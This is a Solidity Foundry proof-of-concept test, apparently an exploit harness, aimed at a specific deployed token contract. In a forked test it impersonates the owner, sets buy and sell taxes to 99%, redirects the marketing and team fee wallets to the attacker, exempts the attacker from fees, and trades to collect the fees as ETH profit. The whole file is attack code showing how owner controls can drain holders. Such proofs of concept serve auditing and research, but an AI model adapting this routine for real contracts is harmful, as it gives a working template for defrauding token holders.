import "forge-std/Test.sol";

interface ITokenTool {
    function uniswapPair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function setMarketingWalletAddress(address newAddress) external;
    function setTeamWalletAddress(address newAddress) external;
    function setIsExcludedFromFee(address account, bool newValue) external;
    function setIsTxLimitExempt(address holder, bool exempt) external;
    function setIsWalletLimitExempt(address holder, bool exempt) external;
    function owner() external view returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Get owner address from storage
        bytes32 ownerSlot = bytes32(uint256(0)); // Ownable stores owner at slot 0
        bytes32 ownerData = vm.load(TARGET, ownerSlot);
        address owner = address(uint160(uint256(ownerData)));

        // Label addresses for clarity
        vm.label(owner, "Owner");
        vm.label(TARGET, "TokenTool");
        vm.label(attacker, "Attacker");

        // Get uniswap pair and router from contract
        ITokenTool token = ITokenTool(TARGET);
        address pair = token.uniswapPair();
        address routerAddress = address(token.uniswapV2Router());

        vm.label(pair, "UniswapPair");
        vm.label(routerAddress, "PancakeRouter");

        // Get WETH address from router
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        address WETH = router.WETH();
        vm.label(WETH, "WETH");

        // Give attacker some ETH for trading
        deal(attacker, 100 ether);

        // Note: Owner has 0 token balance, so we cannot transfer tokens from them
        // We'll buy tokens from the DEX pair instead
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate owner to set up exploit
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 ownerData = vm.load(TARGET, ownerSlot);
        address owner = address(uint160(uint256(ownerData)));

        ITokenTool token = ITokenTool(TARGET);

        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Impersonate owner
        vm.startPrank(owner);

        // Step 2: Set extremely high taxes (33% each for liquidity, marketing, team = 99% total)
        token.setBuyTaxes(33, 33, 33); // 99% buy tax
        token.setSelTaxes(33, 33, 33); // 99% sell tax

        // Step 3: Set marketing and team wallets to attacker address
        token.setMarketingWalletAddress(address(this));
        token.setTeamWalletAddress(address(this));

        // Step 4: Exclude attacker from fees so we don't pay high taxes when trading
        token.setIsExcludedFromFee(address(this), true);

        // Also exclude from tx limits
        token.setIsTxLimitExempt(address(this), true);
        token.setIsWalletLimitExempt(address(this), true);

        vm.stopPrank();

        // Step 5: Get router and prepare for trading
        IUniswapV2Router02 router = IUniswapV2Router02(token.uniswapV2Router());
        address WETH = router.WETH();

        // Give attacker more ETH for trading (already has some from setup)
        deal(address(this), address(this).balance + 10 ether);

        // Step 6: Approve tokens for router (for selling later)
        token.approve(address(router), type(uint256).max);

        // Step 7: Perform a buy transaction to trigger fee collection
        // Create buy path: WETH -> Token
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET;

        // Perform swapExactETHForTokensSupportingFeeOnTransferTokens
        // This will buy tokens, paying 99% fee which goes to contract
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // Step 8: Now sell some tokens to trigger more fees
        // Get token balance to sell
        uint256 tokenBalance = token.balanceOf(address(this));

        // Create sell path: Token -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = WETH;

        // Perform swapExactTokensForETHSupportingFeeOnTransferTokens
        // This will sell tokens, paying 99% fee
        if (tokenBalance > 0) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance / 2, // sell half
                0, // accept any amount
                sellPath,
                address(this),
                block.timestamp
            );
        }

        // Step 9: Trigger swapAndLiquify by making more trades to accumulate tokens in contract
        // Make several more small trades to ensure swapAndLiquify triggers
        for (uint i = 0; i < 3; i++) {
            router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
                0,
                path,
                address(this),
                block.timestamp
            );

            uint256 currentBalance = token.balanceOf(address(this));
            if (currentBalance > 0) {
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    currentBalance / 2,
                    0,
                    sellPath,
                    address(this),
                    block.timestamp
                );
            }
        }

        // Step 10: Check profit - marketing and team wallets should have received ETH
        // Since we set both to attacker address, we should have received ETH
        uint256 finalBalance = address(this).balance;

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker should have profit in ETH");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

